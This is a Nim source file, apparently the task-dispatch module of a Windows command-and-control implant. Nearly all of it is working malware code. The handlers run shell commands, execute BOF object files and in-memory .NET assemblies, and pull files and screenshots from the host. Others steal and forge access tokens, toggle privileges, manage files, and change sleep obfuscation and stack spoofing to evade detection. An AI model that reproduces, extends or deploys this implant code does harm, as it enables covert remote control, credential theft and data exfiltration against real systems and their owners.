import winim/lean
import tables, strformat, strutils
import ../../common/[types, utils]
import ../utils/io
import ../protocol/result
import ./exit
import ./transport/smb
import ../../common/serialize

const MODULES* {.intdefine.} = 0
var commands* = newTable[CommandType, proc(ctx: AgentCtx, task: Task): TaskResult]()

# Assign the "not implemented" function to all commands by default
# This function is overwritten if by the actual implementation if the corresponding module is enabled during the payload generation
for cmd in low(CommandType) .. high(CommandType): 
    commands[cmd] = proc (ctx: AgentCtx, task: Task): TaskResult =
        let command = cast[CommandType](task.command)
        return createTaskResult(task, STATUS_FAILED, RESULT_STRING, string.toBytes(protect("Command \"") & $command & protect("\" not implemented.")))

#[
    Built-in modules (always enabled)
    - exit
    - sleep configuration
    - SMB linking 
]#

commands[CMD_EXIT] = proc(ctx: AgentCtx, task: Task): TaskResult = 
    try: 
        print "   [>] Exiting."

        if task.argCount == 0: 
            exit()
        else: 
            let exitType = parseEnum[ExitType](Bytes.toString(task.args[0].data))
            exit(exitType)

    except CatchableError as err:
        return createTaskResult(task, STATUS_FAILED, RESULT_STRING, string.toBytes(err.msg))
        
commands[CMD_SELF_DESTRUCT] = proc(ctx: AgentCtx, task: Task): TaskResult =
    try: 
        print "   [>] Self-destructing."
        exit(EXIT_PROCESS, true)

    except CatchableError as err:
        return createTaskResult(task, STATUS_FAILED, RESULT_STRING, string.toBytes(err.msg))
        
commands[CMD_SLEEP] = proc(ctx: AgentCtx, task: Task): TaskResult = 
    try: 
        var
            delay = Bytes.toUint32(task.args[0].data) 
            jitter = ctx.sleepSettings.jitter
        
        print fmt"   [>] Setting sleep delay to {delay} seconds with {jitter}% jitter."

        # Optional jitter was passed
        if int(task.argCount) > 1: 
            jitter = Bytes.toUint32(task.args[1].data)
            if jitter < 0 or jitter > 100: 
                raise newException(CatchableError, protect("Invalid jitter value."))                    

        # Updating sleep in agent context
        ctx.sleepSettings.sleepDelay = delay
        ctx.sleepSettings.jitter = jitter 
        return createTaskResult(task, STATUS_COMPLETED, RESULT_NO_OUTPUT, @[])

    except CatchableError as err: 
        return createTaskResult(task, STATUS_FAILED, RESULT_STRING, string.toBytes(err.msg))

commands[CMD_SLEEPMASK] = proc(ctx: AgentCtx, task: Task): TaskResult = 
    try: 
        print fmt"   [>] Updating sleepmask settings."
        
        case int(task.argCount): 
        of 0: 
            # Retrieve sleepmask settings 
            let response = fmt"Sleepmask settings: Technique: {$ctx.sleepSettings.sleepTechnique}, Delay: {$ctx.sleepSettings.sleepDelay}ms, Jitter: {$ctx.sleepSettings.jitter}%, Stack spoofing: {$ctx.sleepSettings.spoofStack}"
            return createTaskResult(task, STATUS_COMPLETED, RESULT_STRING, string.toBytes(response))

        of 1: 
            # Only set the sleepmask technique
            let technique = parseEnum[SleepObfuscationTechnique](Bytes.toString(task.args[0].data).toUpperAscii())
            ctx.sleepSettings.sleepTechnique = technique

        else: 
            # Set sleepmask technique and stack-spoofing configuration
            let technique = parseEnum[SleepObfuscationTechnique](Bytes.toString(task.args[0].data).toUpperAscii())
            ctx.sleepSettings.sleepTechnique = technique

            let spoofStack = cast[bool](task.args[1].data[0]) # BOOLEAN values are just 1 byte
            ctx.sleepSettings.spoofStack = spoofStack

        return createTaskResult(task, STATUS_COMPLETED, RESULT_NO_OUTPUT, @[])

    except CatchableError as err: 
        return createTaskResult(task, STATUS_FAILED, RESULT_STRING, string.toBytes(err.msg))

commands[CMD_LINK] = proc(ctx: AgentCtx, task: Task): TaskResult = 
    try: 
        print "   [>] Linking agent."

        let host = Bytes.toString(task.args[0].data)
        let pipe = Bytes.toString(task.args[1].data)

        # Link agent
        let data = ctx.link("\\\\" & host & "\\pipe\\" & pipe)
        return createTaskResult(task, STATUS_COMPLETED, RESULT_LINK, data)

    except CatchableError as err:
        return createTaskResult(task, STATUS_FAILED, RESULT_STRING, string.toBytes(err.msg))
    
commands[CMD_UNLINK] = proc(ctx: AgentCtx, task: Task): TaskResult = 
    try: 
        print "   [>] Unlinking agent."

        let agentId = Bytes.toString(task.args[0].data)

        # Unlink agent
        ctx.unlink(agentId)
        return createTaskResult(task, STATUS_COMPLETED, RESULT_UNLINK, string.toBytes(agentId))

    except CatchableError as err:
        return createTaskResult(task, STATUS_FAILED, RESULT_STRING, string.toBytes(err.msg))
    
#[
    Optional modules (can be enabled during payload generation)
    - shell execution
    - bof execution
    - dotnet assembly execution
    - looting 
    - token manipulation 
    - filesystem operations
]#

when ((MODULES and cast[uint32](MODULE_SHELL)) == cast[uint32](MODULE_SHELL)):
    import osproc

    commands[CMD_SHELL] = proc(ctx: AgentCtx, task: Task): TaskResult = 
        try: 
            var 
                command: string 
                arguments: string

            # Parse arguments 
            case int(task.argCount): 
            of 1: # Only the command has been passed as an argument
                command = Bytes.toString(task.args[0].data)
                arguments = ""
            else: # The optional 'arguments' parameter was included
                command = Bytes.toString(task.args[0].data)

                for arg in task.args[1..^1]: 
                    arguments &= Bytes.toString(arg.data) & " "

            print fmt"   [>] Executing command: {command} {arguments}"

            let (output, status) = execCmdEx(fmt("{command} {arguments}")) 

            if output != "":
                return createTaskResult(task, cast[StatusType](status), RESULT_STRING, string.toBytes(output))
            else: 
                return createTaskResult(task, cast[StatusType](status), RESULT_NO_OUTPUT, @[])

        except CatchableError as err: 
            return createTaskResult(task, STATUS_FAILED, RESULT_STRING, string.toBytes(err.msg))

when ((MODULES and cast[uint32](MODULE_BOF)) == cast[uint32](MODULE_BOF)):
    import ../utils/coff 

    commands[CMD_BOF] = proc(ctx: AgentCtx, task: Task): TaskResult = 
        try: 
            var 
                objectFile: seq[byte] 
                arguments: seq[byte]

            # Parse arguments 
            case int(task.argCount): 
            of 1: # Only the object file has been passed as an argument
                objectFile = task.args[0].data
                arguments = @[]
            else: # Parameters were passed to the BOF execution
                objectFile = task.args[0].data

                # Combine the passed arguments into a format that is understood by the Beacon API
                arguments = generateCoffArguments(task.args[1..^1])
            
            # Unpacking object file, since it contains the file name too.
            var unpacker = Unpacker.init(Bytes.toString(objectFile))
            let 
                fileName = unpacker.getDataWithLengthPrefix()
                objectFileContents = unpacker.getDataWithLengthPrefix()

            print fmt"   [>] Executing object file {fileName}."
            let output = inlineExecuteGetOutput(string.toBytes(objectFileContents), arguments)

            if output != "":
                return createTaskResult(task, STATUS_COMPLETED, RESULT_STRING, string.toBytes(output))
            else: 
                return createTaskResult(task, STATUS_FAILED, RESULT_NO_OUTPUT, @[])

        except CatchableError as err: 
            return createTaskResult(task, STATUS_FAILED, RESULT_STRING, string.toBytes(err.msg))

when ((MODULES and cast[uint32](MODULE_DOTNET)) == cast[uint32](MODULE_DOTNET)):
    import ../utils/clr 

    commands[CMD_DOTNET] = proc(ctx: AgentCtx, task: Task): TaskResult = 
        try: 
            var 
                assembly: seq[byte] 
                arguments: seq[string]

            # Parse arguments 
            case int(task.argCount): 
            of 1: # Only the assembly has been passed as an argument
                assembly = task.args[0].data
                arguments = @[]
            else: # Parameters were passed to the BOF execution
                assembly = task.args[0].data
                for arg in task.args[1..^1]: 
                    arguments.add(Bytes.toString(arg.data))
            
            # Unpacking assembly file, since it contains the file name too.
            var unpacker = Unpacker.init(Bytes.toString(assembly))
            let 
                fileName = unpacker.getDataWithLengthPrefix()
                assemblyBytes = unpacker.getDataWithLengthPrefix()

            print fmt"   [>] Executing .NET assembly {fileName}."
            let (assemblyInfo, output) = dotnetInlineExecuteGetOutput(string.toBytes(assemblyBytes), arguments)

            if output != "":
                return createTaskResult(task, STATUS_COMPLETED, RESULT_STRING, string.toBytes(assemblyInfo & "\n" & output))
            else: 
                return createTaskResult(task, STATUS_FAILED, RESULT_NO_OUTPUT, @[])

        except CatchableError as err: 
            return createTaskResult(task, STATUS_FAILED, RESULT_STRING, string.toBytes(err.msg))

when ((MODULES and cast[uint32](MODULE_FILETRANSFER)) == cast[uint32](MODULE_FILETRANSFER)):
    import os 

    commands[CMD_DOWNLOAD] = proc(ctx: AgentCtx, task: Task): TaskResult = 
        try: 
            var filePath: string = absolutePath(Bytes.toString(task.args[0].data)) 

            print fmt"   [>] Downloading {filePath}"

            # Read file contents into memory and return them as the result 
            var fileBytes = readFile(filePath)

            # Create result packet for file download            
            var packer = Packer.init() 

            packer.addDataWithLengthPrefix(string.toBytes(filePath))
            packer.addDataWithLengthPrefix(string.toBytes(fileBytes))

            let data = packer.pack() 

            return createTaskResult(task, STATUS_COMPLETED, RESULT_BINARY, data)

        except CatchableError as err: 
            return createTaskResult(task, STATUS_FAILED, RESULT_STRING, string.toBytes(err.msg))

    commands[CMD_UPLOAD] = proc(ctx: AgentCtx, task: Task): TaskResult = 
        try: 
            var arg: string = Bytes.toString(task.args[0].data) 

            # Parse binary argument
            var unpacker = Unpacker.init(arg) 
            var 
                destination = unpacker.getDataWithLengthPrefix() 
                fileContents = unpacker.getDataWithLengthPrefix() 

            # If a destination has been passed as an argument, upload it there instead
            if task.argCount == 2: 
                destination = Bytes.toString(task.args[1].data)
        
            # Write the file to the current working directory
            writeFile(destination, fileContents)

            return createTaskResult(task, STATUS_COMPLETED, RESULT_STRING, string.toBytes(fmt"File uploaded to {destination}."))

        except CatchableError as err: 
            return createTaskResult(task, STATUS_FAILED, RESULT_STRING, string.toBytes(err.msg))

when ((MODULES and cast[uint32](MODULE_SCREENSHOT)) == cast[uint32](MODULE_SCREENSHOT)):
    import times
    import ../utils/screenshot 

    commands[CMD_SCREENSHOT] = proc(ctx: AgentCtx, task: Task): TaskResult = 
        try: 
            print "    [>] Taking and uploading screenshot."

            let
                screenshotFilename: string = fmt"screenshot_{getTime().toUnix()}.jpeg"
                screenshotBytes: seq[byte] = bmpToJpeg(takeScreenshot())

            var packer = Packer.init() 

            packer.addDataWithLengthPrefix(string.toBytes(screenshotFilename))
            packer.addDataWithLengthPrefix(screenshotBytes)

            let data = packer.pack() 

            return createTaskResult(task, STATUS_COMPLETED, RESULT_BINARY, data)

        except CatchableError as err: 
            return createTaskResult(task, STATUS_FAILED, RESULT_STRING, string.toBytes(err.msg))

when ((MODULES and cast[uint32](MODULE_SYSTEMINFO)) == cast[uint32](MODULE_SYSTEMINFO)):
    import ../utils/process

    commands[CMD_PS] = proc(ctx: AgentCtx, task: Task): TaskResult = 
        try: 
            print "   [>] Listing running processes."

            var processes: string = ""            
            var packer = Packer.init() 

            let procList = processList() 
            
            # Add process data to send to the team server
            packer.add(cast[uint32](procList.len()))    
            for procInfo in procList: 
                packer
                    .add(cast[uint32](procInfo.pid))                            # [PID]: 4 bytes 
                    .add(cast[uint32](procInfo.ppid))                           # [PPID]: 4 bytes 
                    .addDataWithLengthPrefix(string.toBytes(procInfo.name))     # [Process name]: Variable 
                    .addDataWithLengthPrefix(string.toBytes(procInfo.user))     # [Process user]: Variable
                    .add(cast[uint32](procInfo.session))                        # [Session]: 4 bytes

            return createTaskResult(task, STATUS_COMPLETED, RESULT_PROCESSES, packer.pack())

        except CatchableError as err: 
            return createTaskResult(task, STATUS_FAILED, RESULT_STRING, string.toBytes(err.msg))

    commands[CMD_ENV] = proc(ctx: AgentCtx, task: Task): TaskResult = 
        try: 
            print "   [>] Displaying environment variables."

            var output: string = ""
            for key, value in envPairs(): 
               output &= fmt"{key}: {value}" & '\n'
               
            return createTaskResult(task, STATUS_COMPLETED, RESULT_STRING, string.toBytes(output))

        except CatchableError as err: 
            return createTaskResult(task, STATUS_FAILED, RESULT_STRING, string.toBytes(err.msg))

when ((MODULES and cast[uint32](MODULE_TOKEN)) == cast[uint32](MODULE_TOKEN)):
    import ../utils/token

    commands[CMD_MAKE_TOKEN] = proc(ctx: AgentCtx, task: Task): TaskResult =  
        try: 
            print fmt"   [>] Creating access token from username and password."
            
            var logonType: DWORD = LOGON32_LOGON_NEW_CREDENTIALS
            var  
                username = Bytes.toString(task.args[0].data)
                password = Bytes.toString(task.args[1].data)
        
            # Split username and domain at separator '\'
            let userParts = username.split("\\", 1)
            if userParts.len() != 2: 
                raise newException(CatchableError, protect("Expected format domain\\username."))
            
            if task.argCount == 3: 
                logonType = cast[DWORD](Bytes.toUint32(task.args[2].data))
            
            let impersonationUser  = makeToken(userParts[1], password, userParts[0], logonType)
            if logonType != LOGON32_LOGON_NEW_CREDENTIALS:
                username = impersonationUser
            return createTaskResult(task, STATUS_COMPLETED, RESULT_STRING, string.toBytes(fmt"Impersonated {username}."))

        except CatchableError as err: 
            return createTaskResult(task, STATUS_FAILED, RESULT_STRING, string.toBytes(err.msg))
        
    commands[CMD_STEAL_TOKEN] = proc(ctx: AgentCtx, task: Task): TaskResult = 
        try: 
            print fmt"   [>] Stealing access token."

            let pid = int(Bytes.toUint32(task.args[0].data))       
            let username  = stealToken(pid)

            return createTaskResult(task, STATUS_COMPLETED, RESULT_STRING, string.toBytes(fmt"Impersonated {username}."))

        except CatchableError as err: 
            return createTaskResult(task, STATUS_FAILED, RESULT_STRING, string.toBytes(err.msg))

    commands[CMD_REV2SELF] = proc(ctx: AgentCtx, task: Task): TaskResult = 
        try: 
            print fmt"   [>] Reverting access token."
            rev2self()
            return createTaskResult(task, STATUS_COMPLETED, RESULT_NO_OUTPUT, @[])

        except CatchableError as err: 
            return createTaskResult(task, STATUS_FAILED, RESULT_STRING, string.toBytes(err.msg))
        
    commands[CMD_TOKEN_INFO] = proc(ctx: AgentCtx, task: Task): TaskResult = 
        try: 
            print fmt"   [>] Retrieving token information."
            let tokenInfo = getCurrentToken().getTokenInfo() 
            return createTaskResult(task, STATUS_COMPLETED, RESULT_STRING, string.toBytes(tokenInfo))

        except CatchableError as err: 
            return createTaskResult(task, STATUS_FAILED, RESULT_STRING, string.toBytes(err.msg))

    commands[CMD_ENABLE_PRIV] = proc(ctx: AgentCtx, task: Task): TaskResult = 
        try: 
            print fmt"   [>] Enabling token privilege."
            let privilege = Bytes.toString(task.args[0].data)            
            return createTaskResult(task, STATUS_COMPLETED, RESULT_STRING, string.toBytes(enablePrivilege(privilege)))

        except CatchableError as err: 
            return createTaskResult(task, STATUS_FAILED, RESULT_STRING, string.toBytes(err.msg))

    commands[CMD_DISABLE_PRIV] = proc(ctx: AgentCtx, task: Task): TaskResult = 
        try: 
            print fmt"   [>] Disabling token privilege."
            let privilege = Bytes.toString(task.args[0].data)            
            return createTaskResult(task, STATUS_COMPLETED, RESULT_STRING, string.toBytes(enablePrivilege(privilege, false)))

        except CatchableError as err: 
            return createTaskResult(task, STATUS_FAILED, RESULT_STRING, string.toBytes(err.msg))

when ((MODULES and cast[uint32](MODULE_FILESYSTEM)) == cast[uint32](MODULE_FILESYSTEM)):
    import algorithm

    commands[CMD_PWD] = proc(ctx: AgentCtx, task: Task): TaskResult = 
        try: 
            print "   [>] Retrieving current working directory."
            
            # Get current working directory using GetCurrentDirectory
            let 
                buffer = newWString(MAX_PATH + 1)
                length = GetCurrentDirectoryW(MAX_PATH, &buffer)
            
            if length == 0:
                raise newException(CatchableError, GetLastError().getError())

            let output = $buffer[0 ..< (int)length]
            return createTaskResult(task, STATUS_COMPLETED, RESULT_STRING, string.toBytes(output))

        except CatchableError as err: 
            return createTaskResult(task, STATUS_FAILED, RESULT_STRING, string.toBytes(err.msg))

    commands[CMD_CD] = proc(ctx: AgentCtx, task: Task): TaskResult = 
        try: 
            let targetDirectory = Bytes.toString(task.args[0].data)

            print fmt"   [>] Changing current working directory to {targetDirectory}."

            # Get current working directory using GetCurrentDirectory
            if SetCurrentDirectoryW(targetDirectory) == FALSE:         
                raise newException(CatchableError, GetLastError().getError())

            return createTaskResult(task, STATUS_COMPLETED, RESULT_NO_OUTPUT, @[])

        except CatchableError as err: 
            return createTaskResult(task, STATUS_FAILED, RESULT_STRING, string.toBytes(err.msg))

    commands[CMD_RM] = proc(ctx: AgentCtx, task: Task): TaskResult = 
        try: 
            let target = Bytes.toString(task.args[0].data)

            print fmt"   [>] Deleting file {target}."

            if DeleteFile(target) == FALSE:         
                raise newException(CatchableError, GetLastError().getError())

            return createTaskResult(task, STATUS_COMPLETED, RESULT_NO_OUTPUT, @[])

        except CatchableError as err: 
            return createTaskResult(task, STATUS_FAILED, RESULT_STRING, string.toBytes(err.msg))
        
    commands[CMD_RMDIR] = proc(ctx: AgentCtx, task: Task): TaskResult = 
        try: 
            let target = Bytes.toString(task.args[0].data)

            print fmt"   [>] Deleting directory {target}."

            if RemoveDirectoryA(target) == FALSE:         
                raise newException(CatchableError, GetLastError().getError())

            return createTaskResult(task, STATUS_COMPLETED, RESULT_NO_OUTPUT, @[])

        except CatchableError as err: 
            return createTaskResult(task, STATUS_FAILED, RESULT_STRING, string.toBytes(err.msg))

    commands[CMD_MOVE] = proc(ctx: AgentCtx, task: Task): TaskResult = 
        try: 
            let 
                lpExistingFileName = Bytes.toString(task.args[0].data)
                lpNewFileName = Bytes.toString(task.args[1].data)

            print fmt"   [>] Moving {lpExistingFileName} to {lpNewFileName}."

            if MoveFile(lpExistingFileName, lpNewFileName) == FALSE:         
                raise newException(CatchableError, GetLastError().getError())

            return createTaskResult(task, STATUS_COMPLETED, RESULT_NO_OUTPUT, @[])

        except CatchableError as err: 
            return createTaskResult(task, STATUS_FAILED, RESULT_STRING, string.toBytes(err.msg))

    commands[CMD_COPY] = proc(ctx: AgentCtx, task: Task): TaskResult = 

        try: 
            let 
                lpExistingFileName = Bytes.toString(task.args[0].data)
                lpNewFileName = Bytes.toString(task.args[1].data)

            print fmt"   [>] Copying {lpExistingFileName} to {lpNewFileName}."

            # Copy file to new location, overwrite if a file with the same name already exists
            if CopyFile(lpExistingFileName, lpNewFileName, FALSE) == FALSE:         
                raise newException(CatchableError, GetLastError().getError())

            return createTaskResult(task, STATUS_COMPLETED, RESULT_NO_OUTPUT, @[])

        except CatchableError as err: 
            return createTaskResult(task, STATUS_FAILED, RESULT_STRING, string.toBytes(err.msg))

    # TODO: Rework this to return unformatted output as a binary stream
    commands[CMD_LS] = proc(ctx: AgentCtx, task: Task): TaskResult = 
        try:
            var targetDirectory: string

            # Parse arguments
            case int(task.argCount):
            of 0: 
                # Get current working directory using GetCurrentDirectory
                let 
                    cwdBuffer = newWString(MAX_PATH + 1)
                    cwdLength = GetCurrentDirectoryW(MAX_PATH, &cwdBuffer)
                
                if cwdLength == 0:
                    raise newException(CatchableError, GetLastError().getError())

                targetDirectory = $cwdBuffer[0 ..< (int)cwdLength]

            of 1:  
                targetDirectory = Bytes.toString(task.args[0].data)
            else:
                discard

            print fmt"   [>] Listing files and directories in {targetDirectory}."
                
            # Prepare search pattern (target directory + \*)
            let searchPattern = targetDirectory & "\\*"
            let searchPatternW = +$searchPattern
            
            var 
                findData: WIN32_FIND_DATAW
                hFind: HANDLE
                output = ""
                entries: seq[string] = @[]
                totalFiles = 0
                totalDirs = 0
            
            # Find files and directories in target directory
            hFind = FindFirstFileW(searchPatternW, &findData)
            
            if hFind == INVALID_HANDLE_VALUE:
                raise newException(CatchableError, GetLastError().getError())
            
            # Directory was found and can be listed
            else:
                output = fmt"Directory: {targetDirectory}" & "\n\n"
                output &= "Mode    LastWriteTime            Length Name" & "\n"
                output &= "----    -------------            ------ ----" & "\n"
                
                # Process all files and directories
                while true:
                    let fileName = $cast[WideCString](addr findData.cFileName[0])
                    
                    # Skip current and parent directory entries
                    if fileName != "." and fileName != "..":
                        # Get file attributes and size
                        let isDir = (findData.dwFileAttributes and FILE_ATTRIBUTE_DIRECTORY) != 0
                        let isHidden = (findData.dwFileAttributes and FILE_ATTRIBUTE_HIDDEN) != 0
                        let isReadOnly = (findData.dwFileAttributes and FILE_ATTRIBUTE_READONLY) != 0
                        let isArchive = (findData.dwFileAttributes and FILE_ATTRIBUTE_ARCHIVE) != 0
                        let fileSize = (int64(findData.nFileSizeHigh) shl 32) or int64(findData.nFileSizeLow)
                        
                        # Handle flags
                        var mode = ""
                        if isDir:
                            mode = "d"
                            inc totalDirs
                        else:
                            mode = "-"
                            inc totalFiles
                        
                        if isArchive:
                            mode &= "a"
                        else:
                            mode &= "-"
                        
                        if isReadOnly:
                            mode &= "r"
                        else:
                            mode &= "-"
                        
                        if isHidden:
                            mode &= "h"
                        else:
                            mode &= "-"
                        
                        if (findData.dwFileAttributes and FILE_ATTRIBUTE_SYSTEM) != 0:
                            mode &= "s"
                        else:
                            mode &= "-"
                        
                        # Convert FILETIME to local time and format
                        var 
                            localTime: FILETIME
                            systemTime: SYSTEMTIME
                            dateTimeStr = protect("01/01/1970  00:00:00")
                        
                        if FileTimeToLocalFileTime(&findData.ftLastWriteTime, &localTime) != 0 and FileTimeToSystemTime(&localTime, &systemTime) != 0:
                            # Format date and time in PowerShell style
                            dateTimeStr = fmt"{systemTime.wDay:02d}/{systemTime.wMonth:02d}/{systemTime.wYear}  {systemTime.wHour:02d}:{systemTime.wMinute:02d}:{systemTime.wSecond:02d}"
                        
                        # Format file size
                        var sizeStr = ""
                        if isDir:
                            sizeStr = protect("<DIR>")
                        else:
                            sizeStr = ($fileSize).replace("-", "")
                        
                        # Build the entry line
                        let entryLine = fmt"{mode:<7} {dateTimeStr:<20} {sizeStr:>10} {fileName}"
                        entries.add(entryLine)
                    
                    # Find next file
                    if FindNextFileW(hFind, &findData) == 0:
                        break
                
                # Close find handle
                discard FindClose(hFind)
                
                # Add entries to output after sorting them (directories first, files afterwards)
                entries.sort do (a, b: string) -> int:
                    let aIsDir = a[0] == 'd'
                    let bIsDir = b[0] == 'd'
                    
                    if aIsDir and not bIsDir:
                        return -1
                    elif not aIsDir and bIsDir:
                        return 1
                    else:
                        # Extract filename for comparison (last part after the last space)
                        let aParts = a.split(" ")
                        let bParts = b.split(" ")
                        let aName = aParts[^1]
                        let bName = bParts[^1]
                        return cmp(aName.toLowerAscii(), bName.toLowerAscii())
                
                for entry in entries:
                    output &= entry & "\n"

                # Add summary of how many files/directories have been found
                output &= "\n" & fmt"{totalFiles} file(s)" & "\n"
                output &= fmt"{totalDirs} dir(s)"

                return createTaskResult(task, STATUS_COMPLETED, RESULT_STRING, string.toBytes(output))

        except CatchableError as err: 
            return createTaskResult(task, STATUS_FAILED, RESULT_STRING, string.toBytes(err.msg))